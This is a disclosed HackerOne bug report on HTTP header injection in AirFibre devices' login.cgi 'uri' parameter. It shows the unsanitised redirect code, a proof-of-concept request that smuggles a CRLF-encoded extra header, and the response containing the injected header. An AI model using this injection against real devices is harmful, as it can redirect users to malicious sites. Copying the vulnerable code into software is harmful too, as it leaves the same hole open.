# AirFibre products vulnerable to HTTP Header injection

## Report Details
- **Report ID**: 203673
- **URL**: https://hackerone.com/reports/203673
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-02-05T21:32:19.196Z
- **Disclosed**: 2017-05-17T17:01:21.732Z

## Reporter
- **Username**: simongurney
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ui

## Vulnerability Information
The uri GET parameter of Login.cgi is directly used (on login) to generate HTTP headers without sanitisation.  An user could be tricked into logging into the device and then redirected to a malicious location or attacked through other HTTP Header injection attacks.

Vulnerable code:
if (isset($uri) && strlen($uri) > 0) {
Header("Location: " + urldecode($uri));
exit;

----------------------
Example POST
POST https://10.62.148.4/login.cgi HTTP/1.1
Connection: keep-alive
Content-Length: 363
Cache-Control: max-age=0
Origin: https://10.62.148.4
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynT8O7Wj9TOBD7eKm
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://10.62.148.4/login.cgi?uri=/admin.cgi%0d%0aNewHeader:Value
Accept-Encoding: br
Accept-Language: en-US,en;q=0.8
Cookie: last_check=1486326659118; AIROS_SESSIONID=a89e9d80a7a7aa87e305f8638458e582; ui_language=en_US
Host: 10.62.148.4

------WebKitFormBoundarynT8O7Wj9TOBD7eKm
Content-Disposition: form-data; name="uri"

/admin.cgi
NewHeader:Value
.....SNIPPED.....

Example response:

HTTP/1.1 302 Found
Location: /admin.cgi
NewHeader: Value
Set-cookie: ui_language=en_US; expires=Tuesday, 19-Jan-38 03:14:07 GMT
Content-Type: text/html
Date: Sun, 05 Feb 2017 21:08:27 GMT
Server: lighttpd/1.4.30



## Attachments
- Untitled.png
